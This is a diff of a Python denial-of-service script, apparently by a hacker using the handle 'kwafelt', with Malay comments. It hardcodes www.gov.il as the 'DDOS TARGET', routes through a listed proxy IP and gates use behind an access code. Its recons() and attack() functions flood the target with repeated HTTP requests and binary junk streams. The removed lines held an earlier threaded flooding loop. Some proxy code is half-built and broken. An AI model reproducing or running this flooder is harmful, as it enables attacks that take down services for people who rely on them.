@@ -1,102 +1,94 @@
 #!/usr/bin/env python3
 #
-import hashlib, json, os, random, socket, sys, time ,uuid
-# from threading import Thread
+import hashlib, json, os, socket, sys, time, uuid
 from requests import get
-import threading
-#
-hello = '''
+# from math import pi
+
+# disable traceback printing
+# sys.tracebacklimit = 0
+
+banner = """
 
        ██   ██ ███    ██ ███    ██ ███████ ███████ ███████  █████     
     ██ ██   ██ ████   ██ ████   ██ ██      ██      ██      ██   ██ ██ 
        ███████ ██ ██  ██ ██ ██  ██ ███████ █████   █████   ███████    
     ██ ██   ██ ██  ██ ██ ██  ██ ██      ██ ██      ██      ██   ██ ▄█ 
        ██   ██ ██   ████ ██   ████ ███████ ██      ███████ ██   ██ ▀  
-                                                                      
-                                                                      
-'''
-wr = ["LOCKED OUT OF SERVER; kwafeLt wAS hERE..","written by kwafelt"]
-ws = ["https://kwafelt.github.io/?stt=raw","https://www.instagram.com/kwafelt/","dragonforce.io/members/30011/"]
 
-Browser_identification = 'Chrome/104.0.5112.102 OPR/90.0.4480.80'
-user_agent2 = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'
-ps4 = "Mozilla/5.0 (PlayStation 4 5.55) AppleWebKit/601.2 (KHTML, like Gecko)"
-user_agent = ps4
+\r\n\t\t\tPERJALANAN DUNIA MENUJU ABADI\r\n
+"""
+workst = os.uname()[0] # workstation
+hostnm = os.uname()[1] # hostname
+platfm = os.uname()[2] # platform
+usernm = os.environ.get('USERNAME') # admin / username
+logger = str(os.getlogin()).replace('K', 'k').replace('l', 'L')
+MAC_hx = hex(uuid.getnode())
 
-# scratch.py
-#
-# import platform
-# operating_system = platform.system()
-# username = platform.uname()
-# hostname = platform.node()
-#
+bb = ['bypass','30011','admin']
+cc = ['hnnsfea-s-comrade; written by kwafeLt','10v3{5h371x1}'] # terminal-title
+sw = ['LOCKED OUT OF SERVER; kwafeLt wAS hERE..','https://lissascafe.github.io/?stt=raw','written by kwafeLt']
+ua = ['Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0','']
+co = ['HTTP/1.0','HTTP/1.1','HTTP/2']
+pb = ['httpbin.org:443'] # blacksheep / honeypot
+
+confrm = ['Do you want to continue ?','Is this ok ?']
+
+cproxy = ('190.61.88.147', 8080) # replace with your proxy's IP address and port number
+addrss = ('www.gov.il', 443) # DDOS TARGET
+server = (socket.gethostbyname(addrss[0]),addrss[1]) # RECONS
+servnm = addrss[0]
+
+ # DORMAN: hanya untuk kegunaan ketika proses DEBUG
+target_host_DEBUG = ['192.168.10.22']
+target_port_DEBUG = [22,80,443,5500]
 # PAUSE
+
+# BASIC SETTING
+def color(r, g, b, text): return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text)
+# sebab saya tak nak guna modul colorama, jadi saya guna function ni sebagai alternatif; tapi leceh sikit la..
+def write(cdata): return sys.stdout.write(cdata) # saya gunakan sys.stdout.write() bagi menggantikan print()
 #
-# server testing script. Your ip is visible.
-
-workstat = os.uname()[0]
-hostname = os.uname()[1]
-platform = os.uname()[2]
-username = os.environ.get('USERNAME')
-admin = str(os.getlogin()).replace('K', 'k').replace('l', 'L')
-MAC = hex(uuid.getnode())
-WHO = f"{admin} wAS hERE"
-
-BLOB = ["Hanna Sofea's comrade \ written by kwafelt", "10v3{5h371x1}"]
-FLAG = BLOB[1]
-ROOT = [""]
-HTTP = ['HTTP/1.0','HTTP/1.1','HTTP/2']
-HOST = ['search.censys.io:443','httpbin.org:443']
-CONN = ['close','Keep-Alive']
-TEXT = ["Injecting process"]
-
-p1 = [sys.argv[0], "",""]
-target_host = None
-target_port = None
-delay = 0.75
-
-question = 'Do you want to continue ?'
-confirm = ['Do you want to continue ?','Is this ok ?']
-
-def color(r, g, b, text):
-  return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text)
-
-def title(c):
-  if (c == 'start'): terminal_title = BLOB[0]
-  if (c == 'prcss'): terminal_title = f'{TEXT[0]} \ {target_host}:{target_port} \ {WHO}'
-  print(f'\33]0;{terminal_title}\a', end = "", flush = True)
-
-def write(c):
-  return sys.stdout.write(c)
-
 def ossys(c):
-  if (workstat == "windows"):
+  if (workst == "windows"):
     c = str(c).replace("clear","cls")
   else: pass
   return os.system(c)
+# PAUSE
 
-def timer(c):
-  Timer(c, parse).start()
+# CONSTR
+rawrrr = [sys.argv[0], "", ""]
+target_host = None
+target_port = None
+delay = 0.0
+# PAUSE
 
-def ctime(c):
+def binary(data):
+  # define the text to convert
+  charac = str(data)
+  # convert each character to binary and concatenate the results
+  return ''.join(format(ord(c), '08b') for c in charac) # return binary
+
+####################################################################################################
+
+def close(cdata):
+  write(f'\r {color(255,196,196,"CTRL-C PRESSED / KEYBOARD INTERRUPT RECEIVED, EXITING..   ")}\r\n')
+  sys.exit(cdata)
+
+def ctime0(data):
   ctime_tuple = time.localtime() # get struct_time
   time_string = time.strftime("%y/%m/%d %H:%M:%S", ctime_tuple)
-  datetime = str(time_string)
-  return datetime
+  return str(time_string) # return datetime
 
-def hash5(txt):
-  str2hash = txt
+def ctime1(data):
+  # get the current Unix timestamp in seconds
+  return str(time.time()) # return timestamp
+
+def hashlb(data):
+  str2hash = str(data).replace(".","")
   result = hashlib.md5(str2hash.encode())
-  digest = result.hexdigest()
-  return digest
+  return result.hexdigest()
 
-def cdata(init):
-  rawr = random.random()
-  rawr = str(rawr).replace("0.","")
-  raws = hash5(rawr)
-  return raws
-
-def reset(init):
+def preset(init):
   ossys('setterm --foreground default --background default --cursor on');
   if (init == 1):
     txt = f'STOPPING python3 {p1[0]} {p1[1]} {p1[2]}'
@@ -104,199 +96,217 @@ def reset(init):
     write(f"\r\n {color(204,204,255,'T3R1M4 K4S3H ~')}\r\n\n")
     sys.exit(1)
 
-def parse(init):
-  global p1
+  
+
+
+
+
+# FUNCTION / MINI-EMBED / casual-const..
+#
+def ipinfo(init):
+  URL = ['http://ip-api.com/json/', f'http://ip-api.com/json/{target_host}'];  # EDT https://ipinfo.io/json/1.1.1.1
+  response = get(URL[init]) # ORIG: requests.get(str)
+  txt = json.loads(response.text)
+  if (txt['status'] == 'success'):
+    tx1 = f"{color(245, 245, 245, txt['country'])} {color(227, 10, 92, txt['regionName'])} {color(0, 110, 210, txt['city'])} {color(245, 245, 245, txt['zip'])}";
+    tx2 = f"\r\n {color(227, 10, 92, txt['isp'])}\n {color(0, 110, 210, txt['query'])}"
+    return tx1 + tx2
+  else:
+    return f"{color(245, 245, 245, txt['query'])} {color(0, 110, 210, txt['message'])}"
+# PAUSE
+
+# FUNCTION / START (PRIMARY)
+#
+def phase1(init):
+  global rawrrr
+  global target_host
+  global target_port
   if (len(sys.argv) == 3):
-    global target_host; global target_port
     FQDN = str(sys.argv[1]).replace("https://", "").replace("http://", "")
-    target_host = str(socket.gethostbyname(FQDN))
-    target_port = int(sys.argv[2])
-    p1 = [sys.argv[0], sys.argv[1], target_port]
-    verif(init)
+    target_host = str(socket.gethostbyname(FQDN)) # set semula host berdasarkan input user
+    target_port = int(sys.argv[2]) # set semula port berdasarkan input user
+    rawrrr = [sys.argv[0], sys.argv[1], target_port]
+    phase2(init)
   else:
     write(f'\r\n Usage: {sys.argv[0]} <target_host> <target_port>')
     write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n')
-    reset(init); sys.exit(init)
+    # rpeset(init); sys.exit(init)
 
-def verif(init):
+def phase2(init): # verify samada target online atau tak wujud dalam talian
   try:
-    r = socket.gethostbyname(target_host); s = socket.create_connection((r, target_port), 2)
-    start(init)
-  except (IOError, OSError):
-    txt = color(245, 45, 45, 'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT')
-    write(f'\r\n {txt}\r\n')
-    reset(0)
+    p1 = socket.gethostbyname(target_host)
+    p2 = socket.create_connection((p1, target_port), 2)
+    phase3(init)
+  except Exception as broken:
+    write(f'\r\n {color(245,45,45,"SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT")}\r\n')
+    preset(0)
   finally: pass
 
-def start(init):
-  ossys('setterm --foreground cyan --background black --cursor on')
-  ossys('clear'); title('start'); write(f"\t{color(248,152,128,hello)}")
-  write(f"\r\n\t{wr[0]}\n\n\t{ws[0]}\n\t{ws[1]}\n\t{ws[2]}\n\n\t{wr[1]}\n")
-  
-  accss('access code')
+def phase3(init):
+  ossys('setterm --foreground cyan --background black --cursor on') # SET semula UI terminal (part-1)
+  ossys('clear') # kosongkan terminal
+  terminal_title = cc[0] # lihat variable: cc
+  print(f'\33]0;{terminal_title}\a', end = "", flush = True) # SET semula terminal_title
+  write(f'{color(227,11,93,banner)}') # paparkan banner
+  credit = f'\r\n\t{sw[0]}\n\n\t{sw[1]}\n\n\t{cc[0]}\n'
+  write(f'{color(245,245,245,credit)}') # i
+  phase4('access code')
 
-def accss(text):
-  reply = input(f"\r\n\t{color(248,152,128,text)}  :  ")
-  if (reply == 'bypass') or (reply == '30011') or (reply == '2022'):
-    press(0)
-  else: accss('  try again')
+def phase4(init):
+  reply = input(f"\r\n\t{color(248,152,128,init)}  :  ")
+  if (reply == bb[0]) or (reply == bb[1]) or (reply == cc[2]): # sila lihat variable bb line 21
+    phase5(0)
+  else:
+    phase4('  try again')
 
-def press(c):
-  ossys('setterm --foreground white --background black --cursor on')
-  ossys('clear')
-  tx1 = color(242,210,189, username)
-  tx2 = color(192,192,192, hostname)
-  tx3 = color(242,210,189, MAC)
-  tx4 = color(192,192,192, workstat)
-  tx5 = color(242,210,189, platform)
+def phase5(init): # paparkan informasi sistem yg digunakan oleh user
+  ossys('setterm --foreground white --background black --cursor on') # SET semula UI terminal (part-2)
+  ossys('clear') # kosongkan terminal
+  # hanya untuk tujuan kosmetik; jangan risau, tiada backdoor atau webhook.
+  tx1 = color(242,210,189, logger) # variable LINE 18
+  tx2 = color(192,192,192, hostnm) # variable LINE 15
+  tx3 = color(242,210,189, MAC_hx) # variable LINE 19
+  tx4 = color(192,192,192, workst) # variable LINE 14
+  tx5 = color(242,210,189, platfm) # variable LINE 16
   write(f'\r\n {tx1} {tx2} {tx3} {tx4} {tx5}\r\n')
-  write(f'\r\n {ipapi(0)}\r\n')
-  tx6 = color(248,152,128, f'wanna/will inject process to {target_host} : {target_port}')
-  write(f'\r\n {tx6}\r\n')
-  write(f'\r\n {ipapi(1)}\r\n')
-  yes_or_no(confirm[0])
+  #
+  # Paparkan maklumat IP address user dan informasi IP address target.
+  # OUTPUT: call dari function sebelumnya / sila RUJUK LINE 115
+  #
+  write(f'\r\n {ipinfo(0)}\r\n') # IP address USER
+  #
+  txt = f'wanna/will inject process to {target_host} : {target_port}'
+  write(f'\r\n {color(248,152,128,txt)}\r\n')
+  #
+  write(f'\r\n {ipinfo(1)}\r\n') # IP address TARGET
+  #
+  yes_or_no(confrm[0]) # CONFIRM..?
+#
+# RETURN CONFIRM..!
 
 def yes_or_no(question):
   reply = input(f'\r\n {color(248,152,128, question)} [y/N] ')
-  if (reply == '') or (reply[0] == 'n'):
-    reset(0); ossys('clear'); return False
+  if (reply == '') or (reply[0] == 'n'): # return False
+    preset(0); ossys('clear'); return False
   if (reply[0] == 'y'):
-    recon(0); #return False
+    ossys('setterm --background black --cursor off') # SET semula UI terminal (part-3)
+    ossys('clear')
+    terminal_title = f'Injecting process \ {target_host}:{target_port}'
+    print(f'\33]0;{terminal_title}\a', end = "", flush = True) # SET semula terminal_title
+    write(f'\r {color(245,215,0,ctime0(0))} {color(255,228,225,"Initial")} {color(245,215,0,"Injecting process..")}\r')
+    procss(0) # RUN SCRIPT
   else: return yes_or_no('so.. YES or NO ?')
 
-def yes_or_no_ORIG(question):  # BROKEN
-  reply = str(raw_input(question + ' [y/N] ')).lower().strip()
-  if reply[0] == 'y': return True
-  if reply[0] == 'n': return False
-  else: return yes_or_no("Uhhhh... please enter ")
-
-def recon(c):
-  ossys('setterm --background black --cursor off')
-  ossys('clear')
-  title('prcss')
-  tx1 = ctime(0)
-  tx2 = TEXT[0]
-  pst = print_status()
-  pst.initial(tx1, tx2)
-  process(0)
-  
 ################################################################################
-def ipapi(i):
-  URL = ['http://ip-api.com/json/', f'http://ip-api.com/json/{target_host}'];  # EDT https://ipinfo.io/json/1.1.1.1
-  response = get(URL[i]) # ORIG: requests.get(str)
-  txt = json.loads(response.text)
-  if (txt['status'] == 'success'):
-  
-    tx1 = f"{color(245, 245, 245, txt['country'])} {color(227, 10, 92, txt['regionName'])} {color(0, 110, 210, txt['city'])} {color(245, 245, 245, txt['zip'])}";
-    tx2 = f"\r\n {color(227, 10, 92, txt['isp'])}\n {color(0, 110, 210, txt['query'])}"
-    out = tx1 + tx2
-  else:
-    out = f"{color(245, 245, 245, txt['query'])} {color(0, 110, 210, txt['message'])}"
-  return out
-
-# about the Requests library here: http://docs.python-requests.org/en/latest/
-#from requests import get
-#def felt():
-# ip = get('https://api.ipify.org').text
-# print(ip) # 'My public IP address is:', ip
-#felt()
+################################################################################
+###################################### UNDER CONSTRUCTION ######################
+def cproxy(proxy_address):
+  # Create a socket connection to the proxy
+  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_sock:
+    proxy_sock.settimeout(13.0)
+    proxy_sock.connect(proxy_address)
+    # Send a CONNECT request to the remote server through the proxy
+    connect_request = 'CONNECT {}:{} HTTP/1.1\r\nHost: {}\r\n\r\n'.format(server_address[0], server_address[1], server_address[0]).encode()
+    status = proxy_sock.sendall(connect_request)
+    
+    if status is None:
+      print('PROXY CONNECTED')
+      request = 'GET / HTTP/1.1\r\nHost: {}\r\n\r\n'
+      
+      
+      proxy_sock.sendto((request).encode('ascii'), server_address)
+      print('success')
+      
+    else:
+      pass
+    
+    # Send a request to the remote server through the proxy
+    request = 'GET / HTTP/1.1\r\nHost: {}\r\n\r\n'.format(server_address[0]).encode('ascii')
+    proxy_sock.sendall(request)
+    
+    # Close the socket connection to the proxy
+    proxy_sock.close()
+############################################################## PAUSE ###########
+################################################################################
 ################################################################################
 
-def address(LAN):
-    if LAN == 0:
-        hostname = socket.gethostname()  # getting the IP address using socket.gethostbyname() method
-        ip_address = socket.gethostbyname(hostname)  # getting the IP address using socket.gethostbyname() method
-        addr = ip_address  # print(f"Hostname: {hostname}") # print(f"IP Address: {ip_address}")
-    if LAN == 1:
-        wifi = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        wifi.connect((remote_server, 80))  # 443
-        addr = wifi.getsockname()[0]
-    return addr
-
-###############################################################################
-class print_status():
-  def initial(self, txt0, txt1):
-    tx1 = color(245, 215, 0, txt0)
-    tx2 = color(99, 99, 99, 'Initial')
-    tx3 = color(255, 215, 0, txt1)
-    write(f'\r {tx1} {tx2} {tx3}..\r')
-  def success(self, txt0, txt1):
-    tx1 = color(224,191,184, txt0)
-    tx2 = color(218,112,214, 'Success')
-    tx3 = color(248,152,128, txt1)
-    tx4 = color(224,191,184, WHO)
-    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
-  def timeout(self, txt0, txt1):
-    tx1 = color(145,145,145, txt0)
-    tx2 = color(245, 245, 245, 'Timeout')
-    tx3 = color(245,215,0,'...ERR_CONNECTION_TIMEOUT_ERR...')
-    tx4 = color(0, 110, 210, 'RE-CONNECTING..')
-    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
-  def failure(self, txt0, txt1):
-    tx1 = color(145, 145, 145, txt0)
-    tx2 = color(245, 110, 110, 'Failure')
-    tx3 = color(245, 1, 1, 'No connection SERVER MAY BE DOWN')
-    tx4 = color(245,110,110, "")
-    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
-  flag = 'ctf{kwafeLt_wAS_hERE}'
-
-###############################################################################
-
-def attack(init):
-  global delay; data = cdata(0); time = ctime(0)
-  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
+def attack(data):
+  static = hashlb(str(f'{ctime1(0)}').replace(".",""))
+  string = ''.join(format(ord(blob), '08b') for blob in static) # convert each character to binary and concatenate the results
+  stream = string.encode('cp1252') # convert the string to bytes using cp1252 encoding
+  #
+  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as bulk:
     try:
-      address = (target_host, target_port)
-      proc.settimeout(3.0); proc.connect(address)
-      b1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nAccept: application/json, text/plain, */*\r\n'
-      b2 = f'Accept-Encoding: gzip, deflate\r\nAccept-Language: en-us, en\r\nConnection: {CONN[1]}\r\n'
-      b3 = f'Keep-Alive: timeout=10, max=100\r\nUser-Agent: {user_agent}\r\n\r\n'
-      proc.sendto((b1).encode('ascii'), address)
-      proc.sendto((b2).encode('ascii'), address)
-      proc.sendto((b3).encode('ascii'), address)
-      # response = len(proc.recv(4096))
+      bulk.settimeout(3.0)
+      bulk.connect(server)
+      for i in range(4096):
+        status = bulk.sendall(stream)
+        stamp4 = hashlb(ctime1(0))
+        if status is None: # check the status of the socket
+          write(f'\r\n {color(196,196,255,ctime0(0))} {color(255,228,225,"Success")} {color(196,196,255,stamp4)}\r')
+        else: # add a break statement to stop after 4096 iterations
+          write(f'ERROR: {status}')
+          close(0)
+        time.sleep(0.003)
+      bulk.close()
+      procss(0)
+    except socket.timeout:
+      time.sleep(0.5)
+      procss(2)
+    except Exception as errr:
+      write(f'\r\n {color(245,245,245,"ERROR:")} {color(245,45,45,errr)}\n {color(245,245,245,"END of LINE..")}\r\n')
+    except KeyboardInterrupt:
+      close(0)
+    finally:
+      while (bulk == True):
+        bulk.close()
+
+def recons(data):
+  #
+  cookie = hashlb(f'{ctime1(0)}')
+  # create a TCP/IP socket
+  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
+    # connect the socket to a remote server
+    try:
+      # server = (target_host, target_port)
+      proc.settimeout(2.3)
+      proc.connect(server)
+      # send some bytes over the socket || HTTP/1.1 request
+      bytes1 = f'GET /?!{cookie} {co[1]}\r\nHost: {servnm}\r\nAccept: */*\r\nUser-Agent: {ua}\r\n\r\n'
+      proc.sendto((bytes1).encode('ascii'), server)
+      #
+      string = ''.join(format(ord(blob), '08b') for blob in cookie) # convert each character to binary and concatenate the results
+      stream = string.encode('cp1252') # convert the string to bytes using cp1252 encoding
+      status = proc.sendall(stream)
+      # check the status of the socket
+      if status is None: # ORIG: 'All bytes were sent successfully'
+        write(f'\r\n {color(255,228,225,ctime0(0))} {color(196,196,255,"Success")} {color(255,228,225,cookie)}\r')
+        # response = len(proc.recv(4096))
+      else: # response = len(proc.recv(4096))
+        print(f'ERROR: {status}'); close(0)
+      # close the socket
       proc.shutdown(socket.SHUT_RDWR)
       proc.close()
-      st = print_status(); st.success(time, data)
-      delay = 0.0
     except socket.timeout:
-      st = print_status(); st.timeout(time, None)
-      delay = 0.5
+      write(f'\r\n {color(128,128,0,ctime0(0))} {color(255,228,225,"Timeout")} {color(128,128,0,"...ERR_CONNECTION_TIMEOUT_ERR...")} {color(45,45,245,"RE-CONNECTING..")}\r')
+      time.sleep(0.5)
     except socket.error:
-      st = print_status(); st.failure(time, None)
-      delay = 1.5
-    except (KeyboardInterrupt, SystemExit):
-      txt = color(204,204,255,f'THREAD {init} / CTRL-C PRESSED / KEYBOARD INTERRUPT')
-      write(f'\r\n\n {txt}\r\n')
-      sys.exit(0)
+      write(f'\r\n {color(227,11,93,ctime0(0))} {color(245,245,245,"Failure")} {color(227,11,93,"No connection SERVER MAY BE DOWN")}\r')
+      time.sleep(2.0)
+    except KeyboardInterrupt:
+      close(0)
     finally: pass
 
-def process(count):
-  while (count < 72540):
+def procss(count):
+  while (count < 11):
     count = count + 1
-    time.sleep(delay)
-    attack(count)
+    recons(count)
+    if (count == 10):
+      attack(count)
+      count = 0
+      break
   else:
-    time.sleep(0.3)
-    tx1 = color(204,204,255,f'THREAD {count} / COMPLETED / {FLAG} / FINN')
-    write(f'\r\n\n {tx1}\r\n')
+    close(0)
   return
-
-def ddos_event(count):
-  for i in range(3):
-    thread = threading.Thread(target=process_pro)
-    thread.start()
-def process_pro():
-  attack(1)
-# D.O.R.M.A.N
-
-################################################################################
-try:
-  parse(0)
-except (KeyboardInterrupt, IOError, OSError):
-  tx1 = color(204,204,255,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..')
-  write(f'\n {tx1}\r\n')
-  sys.exit(0)
-except SystemExit as EXIT: pass
-finally: reset(1); sys.exit(1)
-##############################!TERIMA-KASEH~####################################
+phase1(0) # COMMAND START
+# END
